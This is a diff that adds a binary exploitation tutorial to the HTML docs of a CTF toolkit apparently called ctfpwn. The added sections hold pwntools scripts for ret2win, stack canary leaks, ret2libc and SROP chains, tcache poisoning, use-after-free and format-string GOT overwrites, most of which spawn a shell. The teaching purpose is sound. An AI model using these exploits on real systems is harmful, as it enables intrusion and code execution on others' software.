@@ -256,6 +256,14 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><a href="#examples">Examples</a></li>
         <li><a href="#deps">Dependencies</a></li>
         <li><a href="#author">Author</a></li>
+        <li><div class="sidebar-sep">Deep Dive</div></li>
+        <li><a href="#binary-arch">Binary &amp; CPU Arch</a></li>
+        <li><a href="#bof-internals">Buffer Overflow</a></li>
+        <li><a href="#rop-internals">ROP Chains</a></li>
+        <li><a href="#heap-internals">Heap Exploitation</a></li>
+        <li><a href="#format-string">Format String</a></li>
+        <li><a href="#ctf-customization">Customization</a></li>
+        <li><a href="#ctf-learning">Learning Path</a></li>
       </ul>
     </aside>
 
@@ -691,6 +699,551 @@ sudo pacman -S python git nmap gobuster sshpass hydra nodejs</code></pre>
               </a>
             </div>
           </div>
+        </div>
+      </section>
+
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           BINARY & CPU ARCHITECTURE
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="binary-arch">
+        <h2>Binary Exploitation Architecture</h2>
+        <p><strong>What is binary exploitation?</strong> Programs compiled from C/C++ run directly on the CPU as machine code. When a programmer makes a mistake — trusting user input for a size, forgetting a null terminator, using a freed pointer — an attacker can feed crafted input that corrupts memory and hijacks the program's execution. Binary exploitation is the art of turning memory corruption bugs into controlled code execution.</p>
+
+        <h3>CPU registers (x86-64)</h3>
+        <pre><code>General purpose registers (64-bit names, 32-bit in parentheses):
+  RAX (EAX) — return value, accumulator
+  RBX (EBX) — base, callee-saved
+  RCX (ECX) — counter, 4th arg (System V AMD64 ABI)
+  RDX (EDX) — data, 3rd arg
+  RSI (ESI) — source index, 2nd arg
+  RDI (EDI) — destination index, 1st arg
+  RBP (EBP) — frame pointer (base of current stack frame)
+  RSP (ESP) — stack pointer (top of stack — grows DOWN)
+  RIP (EIP) — instruction pointer (next instruction to execute)
+  R8–R15     — additional argument/scratch registers
+
+# System V AMD64 calling convention (Linux):
+# First 6 args in: RDI, RSI, RDX, RCX, R8, R9
+# Return value: RAX
+# Stack must be 16-byte aligned before CALL</code></pre>
+
+        <h3>Stack frame layout</h3>
+        <pre><code"># When function foo() calls bar():
+# CALL instruction: pushes RIP (return address) then jumps to bar
+
+High addresses
+┌─────────────────────┐  ← caller's frame
+│  local vars (foo)   │
+│  saved RBP          │  ← foo's frame pointer
+│  return addr →foo   │  ← pushed by CALL instruction
+├─────────────────────┤  ← bar's frame starts here
+│  saved RBP          │  ← PUSH RBP (first instruction of bar)
+│                     │  ← RBP now points here
+│  local vars (bar)   │
+│  [buffer[64]]       │  ← char buf[64] lives here
+│                     │
+└─────────────────────┘  ← RSP (top of stack)
+Low addresses
+
+# Stack grows DOWN: RSP decreases as you push/allocate
+
+# GDB: examine stack
+(gdb) x/20xg $rsp    # dump 20 qwords from RSP
+(gdb) info frame      # show saved RIP, RBP of current frame</code></pre>
+
+        <h3>ELF binary format (Linux executables)</h3>
+        <pre><code>ELF Header (64 bytes):
+  7F 45 4C 46       # Magic: "\x7fELF"
+  02                # EI_CLASS = 2 (64-bit)
+  01                # EI_DATA = 1 (little-endian)
+  01                # EI_VERSION = 1
+  00                # EI_OSABI = 0 (System V)
+  [8 bytes padding]
+  02 00             # e_type = ET_EXEC (executable) or 03=ET_DYN (PIE)
+  3E 00             # e_machine = 0x3E = x86-64
+  [entry point, phoff, shoff, flags, header size...]
+
+Key ELF sections:
+  .text    — executable code (r-x)
+  .data    — initialised global variables (rw-)
+  .bss     — uninitialised globals, zeroed at startup (rw-)
+  .rodata  — read-only data: string literals (r--)
+  .plt     — Procedure Linkage Table: stubs for libc functions
+  .got.plt — Global Offset Table: resolved library addresses
+  .dynamic — dynamic linking info (NEEDED libraries, etc.)</code></pre>
+
+        <h3>Binary mitigations (checksec output)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Mitigation</th><th>What it does</th><th>Bypass technique</th></tr></thead>
+            <tbody>
+              <tr><td>NX / DEP</td><td>Stack + heap not executable (W^X)</td><td>ROP — reuse existing code gadgets</td></tr>
+              <tr><td>ASLR</td><td>Randomizes stack/heap/library base addresses</td><td>Leak a pointer, calculate offsets</td></tr>
+              <tr><td>PIE</td><td>Randomizes the binary's own base address</td><td>Leak binary address (format string, partial overwrite)</td></tr>
+              <tr><td>Stack Canary</td><td>Random value before saved RIP; checked before return</td><td>Leak canary (format string), brute force (32-bit)</td></tr>
+              <tr><td>RELRO (Full)</td><td>GOT made read-only after startup</td><td>Harder — need heap/BSS as write target instead</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <pre><code># ctfpwn checksec output:
+{
+  "nx": true,       # NX enabled — no shellcode on stack
+  "pie": true,      # PIE — binary randomized
+  "canary": true,   # Stack canary present
+  "relro": "full",  # Full RELRO — GOT is read-only
+  "arch": "amd64"
+}</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           BUFFER OVERFLOW
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="bof-internals">
+        <h2>Buffer Overflow: From Zero to Shell</h2>
+        <p><strong>What is a buffer overflow?</strong> A buffer is a region of memory used to store data temporarily. When a program copies input into a fixed-size buffer without checking the input length, you can write past the end of the buffer into adjacent memory — including the saved return address on the stack. By controlling what you write there you control where the program jumps when the function returns.</p>
+
+        <h3>Vulnerable C code</h3>
+        <pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vuln() {
+    char buf[64];         // 64 bytes on stack
+    gets(buf);            // reads until newline — NO LENGTH CHECK
+    printf("Hello, %s\n", buf);
+}
+
+int main() {
+    vuln();
+    return 0;
+}
+
+# Stack layout in vuln():
+# [buf: 64 bytes][saved RBP: 8 bytes][saved RIP: 8 bytes]
+# Total to saved RIP: 64 + 8 = 72 bytes
+# Send 72 bytes of padding + 8-byte target address → hijack RIP</code></pre>
+
+        <h3>Finding the offset (ctfpwn bof_detect)</h3>
+        <pre><code># Method 1: cyclic pattern (pwntools)
+from pwn import *
+io = process("./vuln")
+io.sendline(cyclic(200))
+io.wait()
+# Read crash: core dump or dmesg
+core = Coredump("./core")
+offset = cyclic_find(core.fault_addr)
+print(f"Offset to RIP: {offset}")
+
+# Method 2: manual binary search
+# Send 80 A's, 88 A's, 96 A's — watch when RIP becomes 0x4141414141414141
+# Method 3: ctfpwn bof_detect runs automated fuzzing loop</code></pre>
+
+        <h3>ret2win exploit (no ASLR, no PIE)</h3>
+        <pre><code">from pwn import *
+
+# Target binary has a win() function at 0x401234 that calls system("/bin/sh")
+elf = ELF("./vuln")
+win_addr = elf.sym["win"]   # or: p64(0x401234)
+
+offset = 72  # bytes until saved RIP
+
+payload  = b"A" * offset    # padding to reach saved RIP
+payload += p64(win_addr)    # overwrite RIP with win()'s address
+
+io = process("./vuln")
+io.sendline(payload)
+io.interactive()             # get the shell</code></pre>
+
+        <h3>Stack canary bypass via format string leak</h3>
+        <pre><code># If binary has both a format string bug AND a buffer overflow:
+# Step 1: leak the canary with the format string bug
+io.sendline(b"%11$p")   # print 11th stack argument (adjust index for binary)
+leaked = int(io.recvline(), 16)
+canary = leaked
+print(f"Canary: {hex(canary)}")
+
+# Step 2: construct overflow with correct canary in place
+payload  = b"A" * 64           # fill buffer
+payload += p64(canary)         # canary MUST match exactly
+payload += p64(0)              # saved RBP (can be anything)
+payload += p64(win_addr)       # overwrite RIP</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           ROP CHAINS
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="rop-internals">
+        <h2>Return-Oriented Programming (ROP)</h2>
+        <p>NX/DEP prevents executing shellcode on the stack. But you can still control execution by chaining <em>gadgets</em> — small sequences of existing code that end with a <code>RET</code> instruction. Each gadget pops the next return address off the stack and jumps there, so your stack payload is a chain of gadget addresses that collectively do something useful.</p>
+
+        <h3>What is a gadget?</h3>
+        <pre><code># A gadget is any instruction sequence ending in RET found in the binary or libc
+# Examples:
+# 0x401234: pop rdi ; ret     ← set RDI (1st argument) to any value
+# 0x401238: pop rsi ; ret     ← set RSI (2nd argument)
+# 0x401240: pop rdx ; ret     ← set RDX (3rd argument)
+# 0x40129a: ret               ← stack alignment gadget (16-byte align for libc)
+
+# Find gadgets:
+ROPgadget --binary ./vuln --rop
+ropper -f ./vuln
+# ctfpwn rop_chain generates candidates automatically</code></pre>
+
+        <h3>ret2libc chain (calling system("/bin/sh"))</h3>
+        <pre><code">from pwn import *
+
+elf  = ELF("./vuln")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+# Step 1: leak a libc address to defeat ASLR
+# Use a puts(got["puts"]) gadget:
+rop = ROP(elf)
+rop.raw(rop.find_gadget(["pop rdi", "ret"])[0])  # pop rdi ; ret
+rop.raw(elf.got["puts"])                          # rdi = GOT address of puts
+rop.raw(elf.plt["puts"])                          # call puts(GOT[puts])
+rop.raw(elf.sym["main"])                          # return to main for second stage
+
+payload = flat({offset: rop.chain()})
+io.sendline(payload)
+
+# Parse leaked address
+leaked_puts = u64(io.recvline()[:6].ljust(8, b'\x00'))
+libc.address = leaked_puts - libc.sym["puts"]    # calculate libc base
+
+# Step 2: call system("/bin/sh") with known libc base
+binsh  = next(libc.search(b"/bin/sh\x00"))
+system = libc.sym["system"]
+
+rop2 = ROP([elf, libc])
+rop2.raw(rop2.ret.address)                        # alignment gadget
+rop2.raw(rop2.find_gadget(["pop rdi", "ret"])[0])
+rop2.raw(binsh)
+rop2.raw(system)
+
+payload2 = flat({offset: rop2.chain()})
+io.sendline(payload2)
+io.interactive()</code></pre>
+
+        <h3>SROP (Sigreturn-Oriented Programming)</h3>
+        <pre><code># When gadgets are scarce (tiny binary, stripped), use SROP:
+# sigreturn syscall (15) restores ALL registers from a sigframe on the stack
+# You control the entire CPU state in one gadget
+
+from pwn import *
+context.arch = "amd64"
+
+# Build a fake sigframe that sets RIP=system, RDI="/bin/sh", RSP=stack
+frame = SigreturnFrame()
+frame.rax = 0x3b          # sys_execve
+frame.rdi = binsh_addr    # "/bin/sh"
+frame.rsi = 0             # argv = NULL
+frame.rdx = 0             # envp = NULL
+frame.rip = syscall_addr  # syscall ; ret gadget
+
+payload = flat({offset: [syscall_gadget, SigreturnFrame_size, frame]})</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           HEAP EXPLOITATION
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="heap-internals">
+        <h2>Heap Exploitation</h2>
+        <p>The heap is a dynamically allocated memory region managed by ptmalloc2 (glibc's allocator). When a bug lets you read or write out of bounds on a heap chunk, or use memory after it's been freed, you can corrupt allocator metadata and redirect the next <code>malloc()</code> call to return an arbitrary address — giving you a write primitive anywhere in memory.</p>
+
+        <h3>malloc chunk layout</h3>
+        <pre><code># Every malloc(n) allocation is a "chunk" with a header:
+# (on 64-bit — header is 16 bytes)
+
+Allocated chunk:
+  [prev_size: 8B] — only used when prev chunk is FREE
+  [size:      8B] — includes flags in low 3 bits
+                    bit 0 (P) = previous chunk in use
+                    bit 1 (M) = mmapped
+                    bit 2 (A) = non-main arena
+  [user data: n bytes, padded to 16-byte alignment]
+
+Free chunk (returned to allocator):
+  [prev_size: 8B]
+  [size:      8B]  (P bit = 0)
+  [fd:        8B]  — forward pointer (next free chunk)
+  [bk:        8B]  — backward pointer (prev free chunk)
+  [... rest of user data space ...]
+
+# The fd/bk pointers in a free chunk are INSIDE the user data region
+# → corrupting the user data of a freed chunk corrupts the free list</code></pre>
+
+        <h3>tcache (glibc 2.26+)</h3>
+        <pre><code># tcache = per-thread singly-linked free list, one per size class (up to 0x408)
+# Each size has a "bin" holding up to 7 freed chunks
+# tcache entry: [next: 8B][key: 8B][user data...]
+# "next" points to the next free chunk in the bin
+
+# tcache poisoning attack:
+# 1. Allocate two same-size chunks: A, B
+# 2. Free B, then A (A is now tcache head: A→B→NULL)
+# 3. Overflow/UAF to corrupt A's "next" pointer → set to target address
+# 4. malloc() returns A (pops from tcache)
+# 5. malloc() again → tcache head is now target → returns target address!
+# 6. Write to that malloc() return value → arbitrary write
+
+# Example with ctfpwn rop_chain:
+# Corrupt tcache next → point to __free_hook or __malloc_hook
+# Write system address there → next free(ptr_to_binsh) calls system("/bin/sh")</code></pre>
+
+        <h3>Use-After-Free (UAF)</h3>
+        <pre><code># UAF: use a pointer after the memory it pointed to was freed
+# If the freed chunk is re-allocated (to a different object), the stale pointer
+# now points INTO the new object's data — type confusion attack
+
+struct Obj {
+    void (*fn)();   // function pointer at offset 0
+    char  data[56]; // data buffer
+};
+
+// UAF flow:
+Obj *a = malloc(sizeof(Obj));  // allocate
+a-&gt;fn = legit_function;
+free(a);                        // freed — chunk returned to tcache
+char *b = malloc(64);           // same size → same chunk returned
+memcpy(b, attacker_input, 64); // fill with attacker data
+a-&gt;fn();  // UAF: a points to freed/reallocated chunk
+          // a-&gt;fn is now attacker_input[0..7] → arbitrary function call</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           FORMAT STRING
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="format-string">
+        <h2>Format String Exploitation</h2>
+        <p><strong>What is a format string bug?</strong> The C function <code>printf(fmt, ...)</code> treats the format string as instructions: <code>%s</code> reads a string pointer from the stack, <code>%d</code> reads an integer, <code>%x</code> reads a hex value. If user input is passed directly as the format string — <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code> — the attacker controls those instructions.</p>
+
+        <h3>Reading arbitrary memory</h3>
+        <pre><code># printf reads arguments off the stack in order.
+# If you supply more format specifiers than arguments, it reads whatever's there.
+# %N$p reads the Nth argument (stack word) as a pointer.
+
+# Send: "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p"
+# Output: 0x7fff... (stack addresses), 0x555... (binary addresses), etc.
+
+# Identify canary (usually 0x????..??00 — last byte always 0x00):
+# → use it to bypass stack canary in accompanying buffer overflow
+
+# Identify saved RIP → compute PIE/libc offsets → defeat ASLR
+
+# ctfpwn format_string operation:
+# Sends probes "%N$p" for N=1..50, parses output, identifies canary + libc base</code></pre>
+
+        <h3>Writing memory with %n</h3>
+        <pre><code"># %n writes the NUMBER OF BYTES PRINTED SO FAR to the address in the next arg
+# This is a write primitive — you can write any 4-byte value anywhere writable
+
+# Write 0x4141 (16705) to address target_addr:
+# Step 1: Pad output to 16705 bytes using %16705c (print 16705-wide char)
+# Step 2: %N$n — write count to Nth stack argument (which points to target)
+
+from pwn import *
+io = process("./vuln")
+
+target = elf.got["puts"]   # overwrite GOT entry for puts → redirect to win()
+
+# %8$n writes to the address at stack arg 8
+# Arrange: target address sits at stack position 8 (often after ~48 bytes of input)
+fmt  = f"%{win_addr}c%8$n".encode()  # write win_addr's value
+fmt  = fmt.ljust(8)                   # align to 8 bytes
+fmt += p64(target)                    # address to write to at stack pos 8
+
+io.sendline(fmt)
+io.interactive()  # next call to puts() → jumps to win()</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           CUSTOMIZATION
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="ctf-customization">
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Adding a custom exploit generator</h3>
+        <pre><code># tools/ctf/ctfpwn.py — extend with custom exploit template generator
+
+EXPLOIT_TEMPLATES = {
+    "ret2win": """from pwn import *
+elf = ELF('{binary}')
+io = process(elf.path)
+win = elf.sym['{win_fn}']
+payload = b'A' * {offset} + p64(win)
+io.sendline(payload)
+io.interactive()
+""",
+    "ret2libc": """from pwn import *
+elf  = ELF('{binary}')
+libc = ELF('{libc}')
+rop  = ROP(elf)
+# Stage 1: leak puts address...
+""",
+}
+
+def generate_exploit(template_name, **kwargs):
+    template = EXPLOIT_TEMPLATES.get(template_name)
+    if not template:
+        return {"error": f"Unknown template: {template_name}"}
+    code = template.format(**kwargs)
+    outfile = f"exploit_{template_name}.py"
+    with open(outfile, "w") as f:
+        f.write(code)
+    return {"generated": outfile, "code": code}</code></pre>
+
+        <h3>Adding a custom binary analyzer</h3>
+        <pre><code"># Add: automatic vuln function detector (grep for dangerous libc calls)
+import subprocess, re
+
+DANGEROUS_FUNCTIONS = [
+    "gets", "strcpy", "strcat", "sprintf", "scanf",
+    "vsprintf", "memcpy",  # check if size is user-controlled
+    "system",              # if reachable, it's a win condition
+]
+
+def find_dangerous_calls(binary_path):
+    result = subprocess.run(
+        ["objdump", "-d", binary_path],
+        capture_output=True, text=True
+    )
+    findings = []
+    for fn in DANGEROUS_FUNCTIONS:
+        pattern = re.compile(rf'call.*&lt;{fn}')
+        matches = pattern.findall(result.stdout)
+        if matches:
+            findings.append({"function": fn, "calls": len(matches)})
+    return {"dangerous_calls": findings}
+
+# Register as ctfpwn operation:
+# { "name": "vuln_scan", "description": "Detect dangerous libc call sites" }</code></pre>
+
+        <h3>Extending the ROP chain finder</h3>
+        <pre><code"># ctfpwn rop_chain already runs ROPgadget — extend it to auto-suggest chains
+
+from pwn import ROP, ELF
+
+def suggest_rop_chain(binary_path):
+    elf = ELF(binary_path)
+    rop = ROP(elf)
+    suggestions = []
+
+    # Try ret2win
+    for sym in ["win", "shell", "flag", "backdoor", "get_flag"]:
+        if sym in elf.sym:
+            suggestions.append({
+                "type": "ret2win",
+                "target": sym,
+                "address": hex(elf.sym[sym])
+            })
+
+    # Check for system@plt
+    if "system" in elf.plt:
+        suggestions.append({
+            "type": "ret2plt_system",
+            "note": "system@plt found — pair with /bin/sh string and pop rdi gadget"
+        })
+
+    # Check for syscall gadget (for SROP)
+    try:
+        syscall = rop.find_gadget(["syscall", "ret"])
+        if syscall:
+            suggestions.append({"type": "srop_candidate",
+                                 "syscall_gadget": hex(syscall.address)})
+    except Exception:
+        pass
+
+    return {"suggestions": suggestions}</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           CTF LEARNING PATH
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="ctf-learning">
+        <h2>Learning Path</h2>
+
+        <h3>Recommended resources (free first)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Resource</th><th>Format</th><th>Focus</th></tr></thead>
+            <tbody>
+              <tr><td><a href="https://pwn.college" target="_blank">pwn.college</a></td><td>Free interactive course</td><td>Binary exploitation from first principles — ASU curriculum</td></tr>
+              <tr><td><a href="https://exploit.education" target="_blank">exploit.education</a></td><td>Free VMs</td><td>Phoenix/Protostar challenges (stack, heap, format string)</td></tr>
+              <tr><td><a href="https://ctftime.org" target="_blank">CTFtime.org</a></td><td>Event listing</td><td>Find live CTFs by difficulty, category</td></tr>
+              <tr><td><a href="https://tryhackme.com/room/heapexploitation" target="_blank">TryHackMe — Heap Exploitation</a></td><td>Guided lab</td><td>tcache, fastbin, house-of-force</td></tr>
+              <tr><td><a href="https://github.com/Gallopsled/pwntools" target="_blank">pwntools docs</a></td><td>Reference</td><td>Complete API for ELF, ROP, tubes, cyclic</td></tr>
+              <tr><td><em>Hacking: The Art of Exploitation</em> — Jon Erickson</td><td>Book</td><td>x86 ASM, stack overflows, shellcoding from scratch</td></tr>
+              <tr><td><a href="https://ropemporium.com" target="_blank">ROP Emporium</a></td><td>Free challenges</td><td>8 progressive ROP exercises (ret2win → SROP)</td></tr>
+              <tr><td><a href="https://how2heap.github.io" target="_blank">how2heap</a></td><td>Code + explanation</td><td>Every heap technique with working PoC (tcache, fastbin, etc.)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Practice progression (10 weeks)</h3>
+        <pre><code">Week 1 — Assembly and memory
+  ▸ pwn.college: Assembly Crash Course module
+  ▸ Write "hello world" in nasm x86-64 assembly, compile, run
+  ▸ GDB basics: break, run, x/20xg $rsp, info registers
+
+Week 2 — Stack overflows (no mitigations)
+  ▸ exploit.education: Protostar stack0–stack6
+  ▸ ctfpwn analyze + bof_detect on each binary
+  ▸ pwn.college: Program Interaction module
+
+Week 3 — ret2win and shellcode
+  ▸ ROP Emporium: ret2win (x86 and x86-64)
+  ▸ Write 24-byte shellcode: execve("/bin/sh", NULL, NULL)
+  ▸ pwn.college: Shellcode Injection module
+
+Week 4 — Defeating NX: ROP chains
+  ▸ ROP Emporium: split → callme → write4 → badchars
+  ▸ Learn ROPgadget and ropper
+  ▸ Build a ret2libc chain manually (no pwntools helpers)
+
+Week 5 — ASLR + PIE bypass
+  ▸ ROP Emporium: fluff → pivot → ret2csu
+  ▸ Practice: leak GOT entry → compute libc base → ret2system
+  ▸ ctfpwn rop_chain on a PIE binary
+
+Week 6 — Stack canary bypass
+  ▸ Format string leak + overflow combo
+  ▸ exploit.education: Format String challenges
+  ▸ ctfpwn format_string on a test binary
+
+Week 7 — Heap fundamentals
+  ▸ how2heap: tcache_poisoning, fastbin_dup
+  ▸ TryHackMe: Heap Exploitation room
+  ▸ ctfpwn heap_exploit on a test program
+
+Week 8 — CTF practice
+  ▸ CTFtime.org — join a beginner CTF (picoCTF, HSCTF)
+  ▸ Solve at least 3 pwn challenges
+  ▸ Read writeups for challenges you couldn't solve
+
+Week 9 — Kernel basics
+  ▸ pwn.college: Kernel Exploitation module (intro)
+  ▸ Learn: kernel module structure, syscall table, ret2user
+
+Week 10 — Competition readiness
+  ▸ Set up a fast environment: pwndbg + pwntools + tmux
+  ▸ Build a challenge template (ctfpwn generate or your own)
+  ▸ Join a real CTF team on CTFtime.org</code></pre>
+
+        <h3>Essential tools</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Tool</th><th>Purpose</th><th>Install</th></tr></thead>
+            <tbody>
+              <tr><td>pwntools</td><td>Exploit scripting: ELF, ROP, tubes, cyclic</td><td><code>pip install pwntools</code></td></tr>
+              <tr><td>pwndbg</td><td>GDB plugin: heap vis, ROP search, context</td><td><code>yay -S pwndbg</code></td></tr>
+              <tr><td>ROPgadget</td><td>Find ROP gadgets in binaries</td><td><code>pip install ROPGadget</code></td></tr>
+              <tr><td>ropper</td><td>Alternative gadget finder with filtering</td><td><code>pip install ropper</code></td></tr>
+              <tr><td>Ghidra</td><td>NSA decompiler — C pseudocode from binary</td><td>ghidra-sre.org (free)</td></tr>
+              <tr><td>checksec</td><td>Binary mitigation summary</td><td>included with pwntools</td></tr>
+              <tr><td>one_gadget</td><td>Find one-shot execve gadgets in libc</td><td><code>gem install one_gadget</code></td></tr>
+            </tbody>
+          </table>
         </div>
       </section>
 
